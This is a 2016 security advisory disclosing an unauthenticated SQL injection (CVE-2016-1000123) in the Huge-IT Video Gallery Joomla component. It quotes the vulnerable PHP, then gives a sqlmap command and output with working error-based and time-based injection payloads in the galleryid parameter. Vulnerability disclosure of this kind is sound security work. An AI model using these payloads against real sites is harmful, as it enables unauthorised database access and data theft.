
                               Advisory #: 169

   Title: Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9
   for Joomla
   Author: Larry W. Cashdollar, @_larry0
   Date: 2016-09-15
   Download Site: [1]http://huge-it.com/joomla-video-gallery/
   Vendor: www.huge-it.com, fixed v1.1.0
   Vendor Notified: 2016-09-17
   Vendor Contact: info@huge-it.com
   Description: A video slideshow gallery.
   Vulnerability:
   The following code does not prevent an unauthenticated user from
   injecting SQL into functions located in ajax_url.php. Vulnerable Code
   in : ajax_url.php 11 define('_JEXEC',1); 12 defined('_JEXEC') or
   die('Restircted access'); . . . 28
   if($_POST['task']=="load_videos_content"){ 29 30 $page = 1; 31 32 33
   if(!empty($_POST["page"]) && is_numeric($_POST['page']) &&
   $_POST['page']>0){ 34 $paramssld=''; 35 $db5 = JFactory::getDBO(); 36
   $query5 = $db->getQuery(true); 37 $query5->select('*'); 38
   $query5->from('#__huge_it_videogallery_params'); 39
   $db->setQuery($query5); 40 $options_params = $db5->loadObjectList(); 41
   foreach ($options_params as $rowpar) { 42 $key = $rowpar->name; 43
   $value = $rowpar->value; 44 $paramssld[$key] = $value; 45 } 46 $page =
   $_POST["page"]; 47 $num=$_POST['perpage']; 48 $start = $page * $num -
   $num; 49 $idofgallery=$_POST['galleryid']; 50 51 $query =
   $db->getQuery(true); 52 $query->select('*'); 53
   $query->from('#__huge_it_videogallery_videos'); 54
   $query->where('videogallery_id ='.$idofgallery); 55 $query
   ->order('#__huge_it_videogallery_videos.ordering asc'); 56
   $db->setQuery($query,$start,$num);
   CVE-2016-1000123
   JSON:[2] Export
   Exploit Code:

    1. $ sqlmap -u
       'http://example.com/components/com_videogallerylite/ajax_url.php'
       --data="page=1&galleryid=*&task=load_videos_content&perpage=20&link
       button=2" --level=5 --risk=3
    2. .
    3. .
    4. .
    5. (custom) POST parameter '#1*' is vulnerable. Do you want to keep
       testing the others (if any)? [y/N]
    6. sqlmap identified the following injection point(s) with a total of
       2870 HTTP(s) requests:
    7. ---
    8. Parameter: #1* ((custom) POST)
    9. Type: error-based
   10. Title: [3]MySQL OR error-based - WHERE or HAVING clause ([4]FLOOR)
   11. Payload: page=1&galleryid=-3390 OR 1 GROUP BY
       CONCAT(0x716b766271,(SELECT (CASE WHEN (2575=2575) THEN 1 ELSE 0
       [5]END)),0x7170767071,[6]FLOOR([7]RAND(0)*2)) HAVING
       [8]MIN(0)#&task=load_videos_content&perpage=20&linkbutton=2
   12.
   13. Type: AND/OR time-based blind
   14. Title: [9]MySQL >= 5.0.12 time-based blind - Parameter replace
   15. Payload: page=1&galleryid=(CASE WHEN (5952=5952) THEN [10]SLEEP(5)
       ELSE 5952 [11]END)&task=load_videos_content&perpage=20&linkbutton=2
   16. ---
   17. [19:36:55] [INFO] the back-[12]end DBMS is [13]MySQL
   18. web server operating [14]system: Linux Debian 8.0 (jessie)
   19. web application technology: Apache 2.4.10
   20. back-[15]end DBMS: [16]MySQL >= 5.0.12
   21. [19:36:55] [WARNING] HTTP error codes detected during run:
   22. 500 (Internal Server Error) - 2714 times
   23. [19:36:55] [INFO] fetched data logged to text files under
       '/home/larry/.sqlmap/output/192.168.0.4'
   24.
   25. [*] shutting down at 19:36:55

   Screen Shots:
   Advisory: [17]http://www.vapidlabs.com/advisory.php?v=169

References

   1. http://huge-it.com/joomla-video-gallery/
   2. http://www.vapidlabs.com/json.php?s=169
   3. http://www.php.net/mysql
   4. http://www.php.net/floor
   5. http://www.php.net/end
   6. http://www.php.net/floor
   7. http://www.php.net/rand
   8. http://www.php.net/min
   9. http://www.php.net/mysql
  10. http://www.php.net/sleep
  11. http://www.php.net/end
  12. http://www.php.net/end
  13. http://www.php.net/mysql
  14. http://www.php.net/system
  15. http://www.php.net/end
  16. http://www.php.net/mysql
  17. http://www.vapidlabs.com/advisory.php?v=169
